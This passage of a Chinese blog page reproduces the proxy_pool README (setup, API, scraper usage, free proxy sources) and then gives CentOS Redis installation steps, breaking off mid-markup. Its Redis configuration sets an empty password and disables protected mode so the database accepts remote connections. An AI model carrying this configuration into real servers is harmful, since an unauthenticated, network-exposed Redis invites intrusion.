href=\"https://camo.githubusercontent.com/c6c0bbb17cec16cec2d7da6553f8c9a1a99604f27f7c0b8e3faa957dca35bbab/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f507974686f6e2d332e782d626c75652e737667\"><img data-src=\"https://camo.githubusercontent.com/c6c0bbb17cec16cec2d7da6553f8c9a1a99604f27f7c0b8e3faa957dca35bbab/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f507974686f6e2d332e782d626c75652e737667\" alt=\"img\" /></a></li>\n<li>测试地址: <span class=\"exturl\" data-url=\"aHR0cDovL2RlbW8uc3BpZGVycHkuY24v\">http://demo.spiderpy.cn</span> (勿压谢谢)</li>\n<li>付费代理推荐: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9icmlnaHRkYXRhLmdyc20uaW8vcHJveHlQb29s\">luminati-china</span>. 国外的亮数据 BrightData（以前叫 luminati）被认为是代理市场领导者，覆盖全球的 7200 万 IP，大部分是真人住宅 IP，成功率扛扛的。付费套餐多种，需要高质量代理 IP 的可以注册后联系中文客服，开通后有 5 美金赠送和教程指引 (PS: 用不明白的同学可以参考这个<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vamhhby9wLzE1NjExNzg1Lmh0bWw=\">使用教程</span>)。</li>\n</ul>\n<h3 id=\"运行项目\"><a class=\"anchor\" href=\"#运行项目\">#</a> 运行项目</h3>\n<h4 id=\"下载代码\"><a class=\"anchor\" href=\"#下载代码\">#</a> 下载代码:</h4>\n<ul>\n<li>git clone</li>\n</ul>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> clone git@github.com:jhao104/proxy_pool.git</pre></td></tr></table></figure><ul>\n<li>releases</li>\n</ul>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>https://github.com/jhao104/proxy_pool/releases 下载对应zip文件</pre></td></tr></table></figure><h4 id=\"安装依赖\"><a class=\"anchor\" href=\"#安装依赖\">#</a> 安装依赖:</h4>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pip <span class=\"token function\">install</span> -r requirements.txt</pre></td></tr></table></figure><h4 id=\"更新配置\"><a class=\"anchor\" href=\"#更新配置\">#</a> 更新配置:</h4>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># setting.py 为项目配置文件</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 配置 API 服务</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>HOST <span class=\"token operator\">=</span> <span class=\"token string\">\"0.0.0.0\"</span>               <span class=\"token comment\"># IP</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>PORT <span class=\"token operator\">=</span> <span class=\"token number\">5000</span>                    <span class=\"token comment\"># 监听端口</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 配置数据库</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>DB_CONN <span class=\"token operator\">=</span> <span class=\"token string\">'redis://:pwd@127.0.0.1:8888/0'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 配置 ProxyFetcher</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>PROXY_FETCHER <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token string\">\"freeProxy01\"</span>,      <span class=\"token comment\"># 这里是启用的代理抓取方法名，所有 fetch 方法位于 fetcher/proxyFetcher.py</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token string\">\"freeProxy02\"</span>,</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token comment\"># ....</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h4 id=\"启动项目\"><a class=\"anchor\" href=\"#启动项目\">#</a> 启动项目:</h4>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 如果已经具备运行条件，可用通过 proxyPool.py 启动。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 程序分为: schedule 调度程序 和 server Api 服务</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 启动调度程序</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>python proxyPool.py schedule</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 启动 webApi 服务</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>python proxyPool.py server</pre></td></tr></table></figure><h3 id=\"docker运行\"><a class=\"anchor\" href=\"#docker运行\">#</a> Docker 运行</h3>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>docker pull jhao104/proxy_pool</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>docker run --env <span class=\"token assign-left variable\">DB_CONN</span><span class=\"token operator\">=</span>redis://:password@ip:port/0 -p <span class=\"token number\">5010</span>:5010 jhao104/proxy_pool:2.4.0</pre></td></tr></table></figure><h3 id=\"使用\"><a class=\"anchor\" href=\"#使用\">#</a> 使用</h3>\n<ul>\n<li>Api</li>\n</ul>\n<p>启动 web 服务后，默认配置下会开启 <span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMTo1MDEwLw==\">http://127.0.0.1:5010</span> 的 api 接口服务:</p>\n<table>\n<thead>\n<tr>\n<th>api</th>\n<th>method</th>\n<th>Description</th>\n<th>params</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>/</td>\n<td>GET</td>\n<td>api 介绍</td>\n<td>None</td>\n</tr>\n<tr>\n<td>/get</td>\n<td>GET</td>\n<td>随机获取一个代理</td>\n<td>可选参数:  <code>?type=https</code>  过滤支持 https 的代理</td>\n</tr>\n<tr>\n<td>/pop</td>\n<td>GET</td>\n<td>获取并删除一个代理</td>\n<td>可选参数:  <code>?type=https</code>  过滤支持 https 的代理</td>\n</tr>\n<tr>\n<td>/all</td>\n<td>GET</td>\n<td>获取所有代理</td>\n<td>可选参数:  <code>?type=https</code>  过滤支持 https 的代理</td>\n</tr>\n<tr>\n<td>/count</td>\n<td>GET</td>\n<td>查看代理数量</td>\n<td>None</td>\n</tr>\n<tr>\n<td>/delete</td>\n<td>GET</td>\n<td>删除代理</td>\n<td><code>?proxy=host:ip</code></td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>爬虫使用</li>\n</ul>\n<p>如果要在爬虫代码中使用的话， 可以将此 api 封装成函数直接使用，例如：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_proxy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"http://127.0.0.1:5010/get/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">delete_proxy</span><span class=\"token punctuation\">(</span>proxy<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"http://127.0.0.1:5010/delete/?proxy=&#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>proxy<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># your spider code</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getHtml</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\"># ....</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    retry_count <span class=\"token operator\">=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    proxy <span class=\"token operator\">=</span> get_proxy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"proxy\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">while</span> retry_count <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            html <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'http://www.example.com'</span><span class=\"token punctuation\">,</span> proxies<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"http\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"http://&#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>proxy<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token comment\"># 使用代理访问</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">return</span> html</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">except</span> Exception<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            retry_count <span class=\"token operator\">-=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\"># 删除代理池中代理</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    delete_proxy<span class=\"token punctuation\">(</span>proxy<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span></pre></td></tr></table></figure><h3 id=\"扩展代理\"><a class=\"anchor\" href=\"#扩展代理\">#</a> 扩展代理</h3>\n<p>项目默认包含几个免费的代理获取源，但是免费的毕竟质量有限，所以如果直接运行可能拿到的代理质量不理想。所以，提供了代理获取的扩展方法。</p>\n<p>添加一个新的代理源方法如下:</p>\n<ul>\n<li>1、首先在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2poYW8xMDQvcHJveHlfcG9vbC9ibG9iLzFhMzY2NjI4MzgwNmEyMmVmMjg3ZmJhMWE4ZWZhYjdiOTRlOTRiYWMvZmV0Y2hlci9wcm94eUZldGNoZXIucHkjTDIx\"> ProxyFetcher</span> 类中添加自定义的获取代理的静态方法， 该方法需要以生成器 (yield) 形式返回 <code>host:ip</code>  格式的代理，例如:</li>\n</ul>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">ProxyFetcher</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token comment\"># ....</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\"># 自定义代理源获取方法</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token decorator annotation punctuation\">@staticmethod</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">freeProxyCustom1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 命名不和已有重复即可</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token comment\"># 通过某网站或者某接口或某数据库获取代理</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token comment\"># 假设你已经拿到了一个代理列表</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        proxies <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"x.x.x.x:3128\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"x.x.x.x:80\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">for</span> proxy <span class=\"token keyword\">in</span> proxies<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">yield</span> proxy</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\"># 确保每个 proxy 都是 host:ip 正确的格式返回</span></pre></td></tr></table></figure><ul>\n<li>2、添加好方法后，修改<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2poYW8xMDQvcHJveHlfcG9vbC9ibG9iLzFhMzY2NjI4MzgwNmEyMmVmMjg3ZmJhMWE4ZWZhYjdiOTRlOTRiYWMvc2V0dGluZy5weSNMNDc=\"> setting.py</span> 文件中的 <code>PROXY_FETCHER</code>  项：</li>\n</ul>\n<p>在 <code>PROXY_FETCHER</code>  下添加自定义方法的名字:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>PROXY_FETCHER <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token string\">\"freeProxy01\"</span><span class=\"token punctuation\">,</span>    </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token string\">\"freeProxy02\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\"># ....</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token string\">\"freeProxyCustom1\"</span>  <span class=\"token comment\">#  # 确保名字和你添加方法名字一致</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p><code>schedule</code>  进程会每隔一段时间抓取一次代理，下次抓取时会自动识别调用你定义的方法。</p>\n<h3 id=\"免费代理源\"><a class=\"anchor\" href=\"#免费代理源\">#</a> 免费代理源</h3>\n<p>目前实现的采集免费代理网站有 (排名不分先后，下面仅是对其发布的免费代理情况，付费代理测评可以参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zMzU3NjY0MQ==\">这里</span>):</p>\n<table>\n<thead>\n<tr>\n<th>代理名称</th>\n<th>状态</th>\n<th>更新速度</th>\n<th>可用率</th>\n<th>地址</th>\n<th>代码</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>米扑代理</td>\n<td>✔</td>\n<td>★</td>\n<td>*</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wcm94eS5taW12cC5jb20v\">地址</span></td>\n<td><a href=\"https://github.com/jhao104/proxy_pool/blob/master/fetcher/proxyFetcher.py#L27\"> <code>freeProxy01</code> </a></td>\n</tr>\n<tr>\n<td>66 代理</td>\n<td>✔</td>\n<td>★★</td>\n<td>*</td>\n<td><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy42NmlwLmNuLw==\">地址</span></td>\n<td><a href=\"https://github.com/jhao104/proxy_pool/blob/master/fetcher/proxyFetcher.py#L52\"> <code>freeProxy02</code> </a></td>\n</tr>\n<tr>\n<td>开心代理</td>\n<td>✔</td>\n<td>★</td>\n<td>*</td>\n<td><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5reGRhaWxpLmNvbS8=\">地址</span></td>\n<td><a href=\"https://github.com/jhao104/proxy_pool/blob/master/fetcher/proxyFetcher.py#L65\"> <code>freeProxy03</code> </a></td>\n</tr>\n<tr>\n<td>蝶鸟 IP</td>\n<td>✔</td>\n<td>★</td>\n<td>*</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGllbmlhby5jb20v\">地址</span></td>\n<td><a href=\"https://github.com/jhao104/proxy_pool/blob/master/fetcher/proxyFetcher.py#L76\"> <code>freeProxy04</code> </a></td>\n</tr>\n<tr>\n<td>快代理</td>\n<td>✔</td>\n<td>☆</td>\n<td>*</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua3VhaWRhaWxpLmNvbS8=\">地址</span></td>\n<td><a href=\"https://github.com/jhao104/proxy_pool/blob/master/fetcher/proxyFetcher.py#L86\"> <code>freeProxy05</code> </a></td>\n</tr>\n<tr>\n<td>PROXY11</td>\n<td>✔</td>\n<td>★</td>\n<td>*</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wcm94eTExLmNvbS8=\">地址</span></td>\n<td><a href=\"https://github.com/jhao104/proxy_pool/blob/master/fetcher/proxyFetcher.py#L105\"> <code>freeProxy06</code> </a></td>\n</tr>\n<tr>\n<td>云代理</td>\n<td>✔</td>\n<td>★</td>\n<td>*</td>\n<td><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pcDMzNjYubmV0Lw==\">地址</span></td>\n<td><a href=\"https://github.com/jhao104/proxy_pool/blob/master/fetcher/proxyFetcher.py#L116\"> <code>freeProxy07</code> </a></td>\n</tr>\n<tr>\n<td>小幻代理</td>\n<td>✔</td>\n<td>★★</td>\n<td>*</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pcC5paHVhbi5tZS8=\">地址</span></td>\n<td><a href=\"https://github.com/jhao104/proxy_pool/blob/master/fetcher/proxyFetcher.py#L126\"> <code>freeProxy08</code> </a></td>\n</tr>\n<tr>\n<td>免费代理库</td>\n<td>✔</td>\n<td>☆</td>\n<td>*</td>\n<td><span class=\"exturl\" data-url=\"aHR0cDovL2lwLmppYW5neGlhbmxpLmNvbS8=\">地址</span></td>\n<td><a href=\"https://github.com/jhao104/proxy_pool/blob/master/fetcher/proxyFetcher.py#L136\"> <code>freeProxy09</code> </a></td>\n</tr>\n<tr>\n<td>89 代理</td>\n<td>✔</td>\n<td>☆</td>\n<td>*</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuODlpcC5jbi8=\">地址</span></td>\n<td><a href=\"https://github.com/jhao104/proxy_pool/blob/master/fetcher/proxyFetcher.py#L147\"> <code>freeProxy10</code> </a></td>\n</tr>\n</tbody>\n</table>\n<p>如果还有其他好的免费代理网站，可以在提交在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2poYW8xMDQvcHJveHlfcG9vbC9pc3N1ZXMvNzE=\"> issues</span>, 下次更新时会考虑在项目中支持。</p>\n<h3 id=\"问题反馈\"><a class=\"anchor\" href=\"#问题反馈\">#</a> 问题反馈</h3>\n<p>任何问题欢迎在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2poYW8xMDQvcHJveHlfcG9vbC9pc3N1ZXM=\"> Issues</span> 中反馈，同时也可以到我的<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcGlkZXJweS5jbi9ibG9nL21lc3NhZ2U=\">博客</span>中留言。</p>\n<p>你的反馈会让此项目变得更加完美。</p>\n<h3 id=\"贡献代码\"><a class=\"anchor\" href=\"#贡献代码\">#</a> 贡献代码</h3>\n<p>本项目仅作为基本的通用的代理池架构，不接收特有功能 (当然，不限于特别好的 idea)。</p>\n<p>本项目依然不够完善，如果发现 bug 或有新的功能添加，请在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2poYW8xMDQvcHJveHlfcG9vbC9pc3N1ZXM=\"> Issues</span> 中提交 bug (或新功能) 描述，我会尽力改进，使她更加完美。</p>\n<p>这里感谢以下 contributor 的无私奉献：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2thbmdud2g=\">@kangnwh</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JvYm9ibzgw\">@bobobo80</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhbGxleXdq\">@halleywj</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25ld2x5ZWR3YXJk\">@newlyedward</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dhbmcteWU=\">@wang-ye</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dsYWRtbw==\">@gladmo</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Jlcm5pZXlhbmdtaA==\">@bernieyangmh</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbllYWQ==\">@PythonYXY</span>| <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3p1aWppYXdvbml1\">@zuijiawoniu</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25ldEFpcg==\">@netAir</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NjaWw=\">@scil</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3RhbmdyZWxh\">@tangrela</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hpZ2hyb29t\">@highroom</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2x1b2Nhb2Rhbg==\">@luocaodan</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ZjNQ==\">@vc5</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzFhZ2Fpbg==\">@1again</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29iYWl5YW4=\">@obaiyan</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3pzYmg=\">@zsbh</span> | <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ppYW5uYW55YQ==\">@jiannanya</span></p>\n<h3 id=\"release-notes\"><a class=\"anchor\" href=\"#release-notes\">#</a> Release Notes</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2poYW8xMDQvcHJveHlfcG9vbC9ibG9iL21hc3Rlci9kb2NzL2NoYW5nZWxvZy5yc3Q=\">changelog</span></p>\n</div></details>\n<h2 id=\"具体搭建步骤\"><a class=\"anchor\" href=\"#具体搭建步骤\">#</a> 具体搭建步骤</h2>\n<h3 id=\"centos7安装redis数据库\"><a class=\"anchor\" href=\"#centos7安装redis数据库\">#</a> centos7 安装 redis 数据库</h3>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaHVuYW56cC9wLzEyMzA0NjIyLmh0bWw=\">Linux 安装部署 Redis (超级详细)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZWRpcy5pby9kb3dubG9hZA==\">Redis 官网下载地址</span></p>\n<h4 id=\"安装redis精简命令\"><a class=\"anchor\" href=\"#安装redis精简命令\">#</a> 安装 redis 精简命令</h4>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 下载 redis</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">wget</span> http://download.redis.io/releases/redis-5.0.7.tar.gz</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 解压 redis</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">tar</span> -zvxf redis-5.0.7.tar.gz</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 移动解压后的文件夹至 /usr/local 目录。并重命名文件夹为 redis</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">mv</span> /root/redis-5.0.7 /usr/local/redis</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 进入 /usr/local/redis 并进行编译</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">make</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 安装 redis 至当前目录</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">make</span> <span class=\"token assign-left variable\">PREFIX</span><span class=\"token operator\">=</span>/usr/local/redis <span class=\"token function\">install</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># 运行 redis，进入 /usr/local/bin 目录后执行命令</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>./redis-server</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># 停止 redis，进入 /usr/local/bin 目录后执行命令进入控制台</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>./redis-cli</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token comment\"># 进入控制台后执行命令停止 redis</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token function\">shutdown</span></pre></td></tr></table></figure><h4 id=\"修改redis配置文件\"><a class=\"anchor\" href=\"#修改redis配置文件\">#</a> 修改 redis 配置文件</h4>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">vi</span> /usr/local/redis.conf</pre></td></tr></table></figure><div class=\"note info\">\n<p><strong>修改 redis.conf 配置文件后需要重启 redis 服务</strong></p>\n</div>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 设置非密码访问，密码设置为空或注释字段所在行</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>requirepass <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 设置允许远程访问：注释 bind 行，修改 protected-mode 为 no</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">bind</span> <span class=\"token number\">127.0</span>.0.1</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>protected-mode no</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># daemonize yes 表示启用守护进程，默认是 no 即不以守护进程方式运行。其中 Windows 系统下不支持启用守护进程方式运行</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>daemonize no</pre></td></tr></table></figure><h4 id=\"redis常用命令\"><a class=\"anchor\" href=\"#redis常用命令\">#</a> redis 常用命令</h4>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 通过进程查看 redis 是否运行</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ps</span> -aux <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> redis</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 通过端口查看 redis 是否运行</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">netstat</span> -lanp <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> <span 